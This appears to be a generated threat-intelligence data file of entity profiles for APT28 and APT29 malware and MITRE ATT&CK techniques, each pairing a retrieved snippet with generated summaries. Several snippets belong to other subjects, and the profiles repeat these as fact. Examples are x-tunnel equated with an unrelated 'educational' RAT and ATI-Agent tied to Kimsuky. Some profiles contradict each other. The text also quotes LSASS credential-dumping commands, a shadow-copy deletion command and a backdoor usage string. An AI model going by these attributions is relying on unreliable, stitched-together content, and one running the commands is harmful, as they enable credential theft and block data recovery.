379.name: United States Joint Chiefs of Staff

399.name: spear-phishing
399.uncertain_mes:
Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.

Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1672)(Citation: Proofpoint-spoof) the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce) or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., "thread hijacking").(Citation: phishing-krebs)

Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)
399.profile: [profile]Spear-phishing, identified as T1566.001 under the Initial Access tactic, targets Windows, macOS, and Linux. It involves sending tailored electronic messages to specific individuals or organizations, often posing as a trusted source. These messages contain malicious attachments or links to execute code, and may employ evasive techniques like email spoofing, thread hijacking, or using compromised accounts with hidden rules to bypass detection.
399.profile_without_enhance: [profile]Spear-phishing, identified as T1566.001 within the MITRE ATT&CK framework, is a targeted Initial Access technique used across multiple platforms. It involves sending tailored electronic messages, such as emails, to specific individuals or organizations to deliver malicious attachments or links, often leveraging social engineering by posing as a trusted source to trick the user into executing code. This is distinct from broader phishing campaigns due to its focused targeting.

400.name: AdobeArm
400.profile: [profile]AdobeARM is a sophisticated Remote Access Tool (RAT) used by the APT group COZY BEAR (APT29). It is delivered via broadly targeted spearphishing campaigns using malicious droppers, alongside other RATs like ATI-Agent and MiniDionis. Its key behavior is providing remote access to compromised machines. It targets Windows platforms as part of these intrusion campaigns.
400.profile_without_enhance: [profile]AdobeARM is a sophisticated Remote Access Tool (RAT) used by the APT group APT 29 (COZY BEAR). It is delivered via spearphishing campaigns that use malicious droppers. Its key aliases include AdobeARM, and it is associated with other RATs like ATI-Agent and MiniDionis. Its primary function is to provide remote access following initial compromise.

401.name: ATI-Agent
401.uncertain_mes:
Blog update following the release of the testimony by Shawn Henry, CSO and President of CrowdStrike Services, before the House Intelligence Committee that was recently declassified.
What was CrowdStrikeâ€™s role in investigating the hack of the DNC?
401.profile: [profile]ATI-Agent is a malware associated with APT29 (also known as Cozy Bear). It communicates with command-and-control infrastructure using HTTP POST requests to specific URLs, such as those containing the pattern "hxxp://23.106.122[.]16/dash/index.php?&ati=Kur-{Device IMEI}_{Device IMEI}". This infrastructure is also used by other malware families like Fastfire and Fastspy, which are linked to the Kimsuky group.
401.profile_without_enhance: [profile]ATI-Agent, also known as ati-agent, is a malware associated with APT 29. It operates by communicating with command and control infrastructure, as evidenced by specific HTTP request patterns to domains like 23.106.122[.]16 using parameters such as 'ati=Kur-{Device IMEI}_{Device IMEI}'. This indicates targeting of mobile devices, with the IMEI identifier suggesting a focus on Android platforms. The malware is also referenced in the context of other malicious tools like Fastfire, which is linked to the Kimsuky group.

402.name: Minidionis
402.profile: [profile]Minidionis, also known as CLOUDDUKE, is attributed to the APT group Cozy Bear (APT29). It is a malware that utilizes cloud drives for its operations and is related to other malware families such as Seaduke, Geminiduke, and Cozyduke. Its key technical behavior includes establishing persistence via Windows registry keys for automatic execution. The target platform is Windows systems.
402.profile_without_enhance: [profile]Minidionis, also known as CLOUDDUKE, is attributed to APT29 (CozyDuke) and is related to SeaDuke and Geminiduke. It is an APT malware that leverages cloud storage services for command and control and data exfiltration, specifically using cloud drives. Its key technical behavior involves creating a registry key for persistence to ensure automatic execution on system startup. The primary target platform is the Windows operating system.

403.name: virtual machine detection
403.uncertain_mes:
An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. 

Adversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)
403.profile: [profile]Virtual Machine Discovery, identified as T1673, is a Discovery technique within the MITRE ATT&CK framework applicable to Linux, Windows, and VMware ESXi platforms. It involves adversaries enumerating virtual machines after compromising a host or hypervisor, using specific commands like `esxcli vm process list` or `vim-cmd vmsvc/getallvms` on ESXi or accessing graphical interfaces like VMware vCenter. This reconnaissance is used to identify targets for follow-on actions such as Service Stop or Data Encrypted for Impact, and has been associated with groups like UNC3886.[/profile]
403.profile_without_enhance: [profile]Virtual Machine Detection is a technique within the Defense Evasion tactic (T1497.001) used to identify virtualized or sandboxed environments. Adversaries perform system checks for artifacts like specific processes, services, installed programs, hardware properties (e.g., CPU core count, manufacturer strings), and registry keys indicative of a VME. They may use WMI, PowerShell, or query special I/O ports (e.g., in VMware) to gather this evidence. If a virtual environment is detected, malware may alter its behavior, disengage, or withhold core functions to evade analysis and detection.

404.name: debugger detection
404.uncertain_mes: Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github) Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads. Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as IsDebuggerPresent() and NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would â€œswallowâ€ or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug) Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the programâ€™s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the programâ€™s execution to continue.(Citation: Apriorit) Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as OutputDebugStringW().(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)
404.profile: [profile]Debugger Evasion is MITRE ATT&CK technique T1622 under the Defense Evasion tactic for Windows and Linux platforms. It involves malware checking for analysis artifacts to avoid detection, using specific API calls like IsDebuggerPresent() or NtQueryInformationProcess() on Windows, querying /proc/self/status on Linux, leveraging Structured Exception Handling (SEH), or flooding logs with OutputDebugStringW(). Detection triggers altered behavior, such as payload concealment or process disengagement.[profile]
404.profile_without_enhance: [profile]Debugger Detection is a technique used by adversaries to identify the presence of debugging tools analyzing their malware, falling under the Defense Evasion tactic. On Windows, this involves API calls like IsDebuggerPresent() or checking the BeingDebugged flag in the Process Environment Block (PEB). On Linux, adversaries may query the TracerPID field in /proc/self/status. Other methods include using Structured Exception Handling (SEH) to throw an exception and detect if process execution is suspended by a debugger, or performing checks for hardware breakpoints and timing anomalies.

405.name: sandbox detection
405.uncertain_mes:
Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)
405.profile: [profile]Virtualization/Sandbox Evasion, identified as T1497, is a Defense Evasion technique applicable to multiple platforms. It involves detecting analysis environments by checking for artifacts like security monitoring tools (e.g., Sysinternals, Wireshark), VM-specific hardware or registry entries, and low user activity. Upon detection, malware may alter its behavior, disengage, or use sleep timers to evade temporary sandboxes. Groups like Cozy Bear, DarkHotel, and Gamaredon Group have employed this technique.[/profile]
405.profile_without_enhance: [profile]Sandbox Detection, corresponding to MITRE ATT&CK technique T1497 (Virtualization/Sandbox Evasion) under the Defense Evasion tactic for Windows, Linux, and macOS platforms, involves malware checking for artifacts indicative of a virtual machine or analysis environment to avoid detection. Technical mechanics include scanning for security monitoring tools, checking system properties like CPU core count or installed programs, and looking for user activity indicators such as mouse movement frequency. If a sandbox is detected, the malware may alter its behavior, disengage, or delay execution using sleep timers to evade automated analysis.

406.name: security software configuration checks
406.uncertain_mes: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), reg query with [Reg](https://attack.mitre.org/software/S0075), dir with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software. Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents may collect metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.
406.profile: [profile]Security Software Discovery, identified as T1518.001 under the Discovery tactic, operates on Windows, macOS, and cloud platforms. Adversaries enumerate installed security applications and configurations, such as antivirus, firewalls, and cloud monitoring agents like AWS CloudWatch or Azure VM Agent, to inform follow-on actions. Specific technical mechanics include using commands like `netsh`, `reg query`, `dir`, and `tasklist` on Windows, while macOS malware often checks for LittleSnitch and KnockKnock software. Cloud-based discovery leverages Cloud APIs. This technique is associated with numerous threat groups, including Cozy Bear, Wizard Spider, and MuddyWater.[/profile]
406.profile_without_enhance: [profile]Security Software Configuration Checks is a technique within the Discovery tactic, applicable to Windows and macOS platforms. It involves adversaries checking the specific settings and rules of installed security tools, such as firewall configurations and antivirus exclusions, to understand the defensive posture and identify potential weaknesses. This reconnaissance enables them to tailor follow-on actions, like evading detection or disabling security controls, based on the discovered configurations.

407.name: encrypted configuration files
407.uncertain_mes:
Introduction
Zscalerâ€™s ThreatLabz threat research team recently has spotted a new variant of the emerging X-FILES infostealer attack with enhanced features to exfiltrate sensitive information. X-FILES is a stealer that aims to steal sensitive information, including logins and financial data.
407.profile: [profile]The malware is known as X-FILES Stealer, an infostealer variant that exfiltrates sensitive information such as logins and financial data. It is attributed to an unknown threat actor. Key technical behaviors include the use of encrypted configuration files and an encrypted file structure. The target platform is unspecified, but it operates as a stealer designed for data theft.
407.profile_without_enhance: [profile]Name: encrypted configuration files. Aliases: None specified. Attributed Groups: Not attributed to a specific group. Key TTPs/Technical Behaviors: This malware component is characterized by the use of encrypted configuration files, a technique also employed by malware like Ousaban, which utilizes an encrypted configuration file among its components. Target Platforms: Not specified. Infrastructure/Supplementary Info: The encryption of configuration files is a common obfuscation method to hinder analysis and detection.

408.name: persistence mechanism
408.uncertain_mes:
Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)

In some instances, artifacts of persistence may also be removed once an adversaryâ€™s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)
408.profile: [profile]Clear Persistence, identified as T1070.009 under the Defense Evasion tactic, is a technique where adversaries remove artifacts of previously established persistence mechanisms on a host to eliminate evidence of their activity. This cleanup can involve actions like deleting malicious services or executables, modifying the Windows Registry or macOS Plist files, and removing accounts created for persistence, thereby hindering forensic collection and preventing errors with new malware instances.
408.profile_without_enhance: [profile]The entity "persistence mechanism" is a general concept, not a specific MITRE ATT&CK technique with a designated ID. It refers to methods adversaries use to maintain access across system restarts. Specific techniques include modifying property list files like ~/Library/Preferences/com.apple.loginwindow.plist to re-open malicious applications on macOS reboot, abusing deprecated Startup Items in /Library/StartupItems to run shell scripts as root during boot, and tampering with low-level firmware or boot drivers (Pre-OS Boot) to establish a layer of persistence below the operating system.

409.name: comprehensive implant testing mechanism
409.uncertain_mes:
Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victimâ€™s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)

A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)
409.profile: [profile]Implant Internal Image is MITRE ATT&CK technique T1525 under the Persistence tactic, targeting Cloud platforms. It involves adversaries implanting malicious code into cloud or container images within a victim's registry, such as AWS AMIs, GCP Images, Azure Images, or Docker containers, to establish persistent access. This differs from external malware uploads, as it focuses on internal registry compromise, potentially providing long-term persistence if infrastructure provisioning tools are configured to use the latest implanted image, with specific tools developed to facilitate planting backdoors like web shells.
409.profile_without_enhance: [profile]The entity "comprehensive implant testing mechanism" is not a standard MITRE ATT&CK technique. Based on the provided context, it appears to be a specialized adversarial procedure for validating malicious implants. This mechanism likely involves checking for internet connectivity using tools like ping or tracert to confirm the compromised system can communicate with command and control servers before establishing a connection.

410.name: SOFACY
410.uncertain_mes:
[APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)

[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.(Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034).
410.profile: [profile]SOFACY, also known as APT28, Fancy Bear, Sednit, Pawn Storm, and STRONTIUM, is a Russian state-sponsored threat group attributed to the GRU's 85th Main Special Service Center (military unit 26165). Its arsenal includes custom malware such as Sofacy Carberp and DealersChoice. The group is known for conducting cyber espionage and influence operations, notably compromising the Democratic National Committee in 2016 to interfere with the U.S. presidential election. It primarily targets government, political, and defense sectors in North America and Europe, motivated by intelligence gathering and geopolitical disruption.
410.profile_without_enhance: [profile]The intrusion set is definitively identified as APT28, also known as Fancy Bear, Sofacy, Sednit, Strontium, Pawn Storm, Tsar Team, and Threat Group 4127. Its key custom malware includes the modular X-Agent (CHOPSTICK) and X-Tunnel backdoors, Zebrocy, Seduploader, and variants like the Carberp-based JhuHugit. Key TTPs involve sophisticated spear-phishing, exploitation of zero-day vulnerabilities in software like Adobe Flash and Microsoft Office, and data exfiltration via tools like USBStealer. The group is attributed to Russia's GRU military intelligence, specifically Units 26165 and 74455. It primarily targets government, military, political, and diplomatic organizations in NATO countries, Europe, Ukraine, and North America, motivated by strategic cyber espionage and information operations to support Russian state interests.[/profile]
410.profile_without_enhance_0: [profile]SOFACY, also known as APT28, Fancy Bear, Sednit, Tsar Team, Strontium, and Pawn Storm, is a highly active intrusion set attributed to Russia's GRU military intelligence agency. It employs custom malware such as the Sofacy Carberp variant and DealersChoice, and is known for sophisticated spear-phishing campaigns and zero-day exploits. The group primarily targets government, military, and political organizations in NATO countries, Eastern Europe, and former Soviet states, with motivations centered on espionage, information theft, and influencing geopolitical events. Its operations show significant overlaps with other Russian state-sponsored groups, maintaining a persistent focus on strategic intelligence collection.

423.name: seadaddy
423.uncertain_mes:
The post contains malware samples analyzed in the APT28 reports linked below. I will post APT29 and others later.
List of References (and samples mentioned) listed from oldest to newest:
- APT28_2011-09_Telus_Trojan.Win32.Sofacy.A
- APT28_2014-08_MhtMS12-27_Prevenity
- APT28_2014-10_Fireeye_A_Window_into_Russia_Cyber_Esp.Operations
- APT28_2014-10_Telus_Coreshell.A
423.profile: [profile]Seadaddy, also known as SeaDaddy, is a malware implant attributed to the APT29 (Cozy Bear) intrusion set. It is developed in Python and compiled with py2exe for deployment on Windows systems. Its key technical behaviors include establishing persistence via the Windows Management Instrumentation (WMI) system to automatically launch malicious code based on system uptime or a specific schedule, and it operates alongside a PowerShell backdoor as part of the group's intrusions.[/profile]
423.profile_without_enhance: [profile]Seadaddy, also known as SeaDaddy, is attributed to APT29 (COZY BEAR). It is a Python-based implant compiled with py2exe, used alongside a PowerShell backdoor. Persistence is achieved via Windows Management Instrumentation (WMI) to automatically launch malicious code based on system uptime or a schedule. The primary target platform is Windows.

424.name: PowerShell backdoor
424.uncertain_mes: powershell_web_backdoor This is a very simple powershell web backdoor Usage: hxxp://127.0.0.1:9999/backdoor/?cmd=<Insert Your powershell compatible base64 encoded command here
424.profile: [profile]PowerShell backdoor, also known as powershell_web_backdoor, is a simple web-based backdoor attributed to the Cozy Bear intrusion set. It operates by accepting base64-encoded PowerShell commands via a web request parameter (e.g., ?cmd=) to a specified URL, such as hxxp://127.0.0.1:9999/backdoor/, enabling remote command execution. Related entities include ftcode, which adds Domain Generation Algorithm (DGA) capability, and prb (PRB-Backdoor), indicating variants with expanded malicious functionality. The primary target platform is Windows, leveraging PowerShell for execution.[/profile]
424.profile_without_enhance: [profile]PowerShell backdoor, also known as ftcode and PRB-Backdoor, is attributed to the powerpool group. Its key technical behaviors include functioning as a web backdoor that executes base64-encoded PowerShell commands received via HTTP parameters and can incorporate Domain Generation Algorithm (DGA) capabilities. It primarily targets Windows platforms through PowerShell execution.

425.name: Windows Management Instrumentation (WMI) system
425.uncertain_mes:
Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.

The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)

**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being â€œdisabled by defaultâ€ on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)
425.profile: [profile]Windows Management Instrumentation (WMI) is MITRE ATT&CK technique T1047, primarily used for Execution and Discovery on Windows. It provides a uniform environment for local and remote system management, enabling adversaries to execute commands and payloads via tools like wmic.exe (e.g., `wmic.exe Shadowcopy Delete` for Inhibit System Recovery) or programmatically through PowerShell, COM APIs, or wbemtool.exe. Remote access is facilitated via DCOM on port 135 or WinRM on ports 5985/5986. The deprecated wmic.exe is being replaced by PowerShell as the primary interface. Numerous threat groups, including APT29 and Lazarus Group, are known to abuse WMI.
425.profile_without_enhance: [profile]The entity is the Windows Management Instrumentation (WMI) system, corresponding to MITRE ATT&CK technique T1047 under the Execution tactic for Windows platforms. It is a built-in administration infrastructure that adversaries abuse to execute malicious commands and payloads locally or remotely, often using tools like the deprecated `wmic.exe` or PowerShell. WMI can facilitate behaviors such as discovery and system manipulation, exemplified by commands like `wmic.exe Shadowcopy Delete` to inhibit recovery. Remote access is enabled via protocols like DCOM on port 135 or WinRM on ports 5985/5986.

427.name: encrypted connection with C2
427.uncertain_name: exfiltration over asymmetric encrypted non-c2 protocol
427.uncertain_mes:
Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.
427.profile: [profile]Encrypted Connection with C2, also known as Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002), is an Exfiltration tactic used across multiple platforms. This technique involves stealing data over a separate, asymmetrically encrypted network channel, distinct from the primary command and control (C2) channel, often using native protocol encryption like HTTPS/TLS/SSL where public and private key pairs secure the initial communication. It is associated with threat groups including APT28, Curium, and Storm-1811.
427.profile_without_enhance: [profile]The entity "Encrypted Connection with C2" aligns with the MITRE ATT&CK technique Encrypted Channel (T1573) under the Command and Control tactic, applicable to multiple platforms. This technique involves adversaries using custom encryption algorithms to obfuscate C2 traffic, separate from any inherent protocol encryption like HTTPS, to avoid detection and hinder traffic analysis. Implementations may be vulnerable if secret keys are embedded within the malware. Related behaviors include using multilayer encryption (T1079) by tunneling custom encryption within standard protocols and employing external proxies (T1090.002) to further conceal the C2 server's location.

428.name: executing them in memory
428.uncertain_mes: Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550). As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host use procdump: * procdump -ma lsass.exe lsass_dump Locally, mimikatz can be run using: * sekurlsa::Minidump lsassdump.dmp * sekurlsa::logonPasswords Built-in Windows tools such as `comsvcs.dll` can also be used: * rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector) Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS) Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014) The following SSPs can be used to access credentials: * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection) * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
428.profile: [profile]LSASS Memory is MITRE ATT&CK technique T1003.001 under the Credential Access tactic for Windows. It involves accessing credential material stored in the Local Security Authority Subsystem Service (LSASS) process memory after user logon. Specific mechanics include dumping LSASS memory using tools like procdump (`procdump -ma lsass.exe`) or built-in Windows utilities like `comsvcs.dll` via `rundll32.exe`, then analyzing the dump locally with tools like Mimikatz (`sekurlsa::logonPasswords`). Adversaries can also abuse the silent process exit mechanism or modify Security Support Provider (SSP) Registry keys to harvest credentials. It is associated with numerous threat groups, including APT28, APT41, and Volt Typhoon.[/profile]
428.profile_without_enhance: [profile]The entity "executing them in memory" is a technique for running code directly in a process's memory to evade detection and potentially gain elevated privileges. It involves injecting malicious code, such as a Portable Executable (PE), into the address space of a legitimate live process using API calls like VirtualAllocEx and WriteProcessMemory, then executing it via CreateRemoteThread. This method masks execution under a legitimate process and can be performed on Windows systems, aligning with the Defense Evasion and Privilege Escalation tactics.

429.profile: [profile]x-agent, also known as Xagent, is a malware attributed to the APT28 group (Fancy Bear). It is a Windows-based surveillance tool that copies itself into the system directory (using filenames like crisvc.exe or igfxcri.exe) and deletes its initial dropped copy. The malware was introduced in a version for Windows in 2014 and is associated with other APT28 tools like Xtunnel.[/profile]
429.profile_without_enhance: [profile]X-Agent is a malware, also known as Sofacy, used by APT28. It employs techniques such as remote command execution, file transfer, and abuse of rundll32 for defense evasion and execution, as well as keylogging for credential access. It targets Windows platforms and has been referenced in reports since at least 2011, with infrastructure components like XTunnel noted.]

430.name: x-tunnel
430.uncertain_mes: X-ZIGZAG is a lightweight and stealthy RAT designed for educational purposes. With a focus on small size and undetectability, X-ZIGZAG operates entirely in RAM, ensuring no traces are left on the target system. This tool is built without relying on any external libraries or third-party dependencies, making it both efficient and versatile.
430.profile: [profile]x-tunnel, also known as x-zigzag, is a lightweight and stealthy Remote Access Trojan (RAT) attributed to the APT28 (Fancy Bear) intrusion set. It operates entirely in RAM to leave no traces on the target system and is built without external dependencies for efficiency. Its key technical behavior is functioning as a network tunneling tool for secure command and control communication and network pivoting. It was first observed in the wild in May 2013 and has been used in compromises including the 2016 DNC hack.[/profile]
430.profile_without_enhance: [profile]X-Tunnel is a network tunneling tool used for network traversal and pivoting, attributed to APT28. It provides a secure tunnel to an external command and control server and was used in compromises including the 2016 DNC hack. Its key TTPs include remote command execution and operating in NAT-ed environments for defense evasion and lateral movement, primarily targeting network infrastructure.

431.name: remote command execution
431.uncertain_mes:
